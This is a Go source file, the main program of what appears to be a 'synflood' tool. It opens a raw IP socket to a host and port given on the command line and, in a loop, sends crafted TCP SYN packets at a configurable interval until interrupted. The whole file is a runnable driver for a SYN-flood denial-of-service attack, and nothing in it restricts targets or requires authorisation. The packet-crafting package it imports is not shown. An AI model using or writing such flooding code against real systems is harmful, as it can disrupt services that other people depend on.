package main

import (
	"flag"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/amartorelli/synflood/pkg/pktcrafter"
	"github.com/sirupsen/logrus"
)

func main() {
	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)

	formatter := &logrus.TextFormatter{
		FullTimestamp: true,
	}
	logrus.SetFormatter(formatter)

	interval := flag.Int("interval", 3000, "interval in milliseconds to send packets")
	host := flag.String("host", "", "the host you want to send the packets to")
	port := flag.Int("port", 0, "the port to send the packets to")
	flag.Parse()

	if *host == "" || *port == 0 {
		logrus.Fatal("host and/or port undefined")
	}

	dst, err := net.ResolveIPAddr("ip", *host)
	if err != nil {
		logrus.Fatal(err)
	}
	s, err := net.DialIP("ip4:tcp", nil, dst)
	if err != nil {
		logrus.Fatal(err)
	}

	c := pktcrafter.NewCrafter()

	for {
		select {
		case <-time.After(time.Duration(*interval) * time.Millisecond):
			pkt := c.CraftSyn(*port)
			buf, err := pkt.Bytes()
			if err != nil {
				logrus.Error(err)
			}

			s.Write(buf)
			logrus.Printf("sent packet %+v\n", pkt)
		case s := <-sigs:
			logrus.Infof("received signal %s, exiting", s.String())
			return
		}
	}

}
